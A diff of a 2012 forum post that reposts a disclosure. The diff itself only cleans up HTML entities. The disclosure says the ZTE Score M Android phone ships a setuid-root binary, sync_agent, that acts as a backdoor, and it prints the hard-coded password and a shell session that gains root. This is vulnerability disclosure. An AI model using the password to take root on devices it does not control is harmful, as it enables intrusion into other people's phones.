@@ -5,15 +5,15 @@ Posted by **XlogicX** on Thu May 17th, 2012 03:38:13 AM
 
 Contents of the paste:
 
-[code:3gdsead2]The ZTE Score M is an Android 2&#46;3&#46;4 (Gingerbread) phone available in the United States on MetroPCS, made by Chinese telecom ZTE Corporation&#46;
+[code:3gdsead2]The ZTE Score M is an Android 2.3.4 (Gingerbread) phone available in the United States on MetroPCS, made by Chinese telecom ZTE Corporation.
 
-There is a setuid-root application at /system/bin/sync_agent that serves no function besides providing a root shell backdoor on the device&#46;  Just give the magic, hard-coded password to get a root shell&#58;
+There is a setuid-root application at /system/bin/sync_agent that serves no function besides providing a root shell backdoor on the device.  Just give the magic, hard-coded password to get a root shell:
 
 $ sync_agent ztex1609523
 # id
 uid=0(root) gid=0(root)
 
-Nice backdoor, ZTE&#46;[/code:3gdsead2]
+Nice backdoor, ZTE.[/code:3gdsead2]
 
 --------------------------------------------------------------------------------
 
